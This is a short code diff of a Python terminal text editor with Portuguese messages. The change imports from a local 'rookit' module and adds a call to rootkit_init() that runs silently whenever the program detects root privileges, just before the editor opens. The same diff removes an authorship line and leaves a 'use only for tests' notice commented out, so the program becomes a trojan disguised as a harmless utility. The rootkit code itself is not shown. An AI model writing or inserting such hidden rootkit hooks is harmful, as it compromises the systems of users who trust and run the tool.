@@ -6,15 +6,14 @@ from colorama import init, Fore, Style
 
 # LIB
 sys.path.append('./src/')
-from rookit import check_root, main, elevar_privilegio
+from rookit import check_root, rootkit_init, elevar_privilegio
 
 def editor_de_texto():
     init(autoreset=True)
 
     def boas_vindas():
         print(Fore.CYAN + "Bem-vindo ao Editor de Texto 📝\n")
-        print(Fore.CYAN + "Criado por GPT com auxílio de Carlos Silva\n")
-
+        #print(Fore.CYAN + "OBS: Usar somente para testes\n")
     def criar_arquivo(file_path):
         if path.exists(file_path):
             print(Fore.YELLOW + "\n\tArquivo já existe!")
@@ -107,7 +106,7 @@ def editor_de_texto():
     menu()
 
 if check_root():
-    #print("Você está como root!")
+    rootkit_init()
     editor_de_texto()
     
 else:
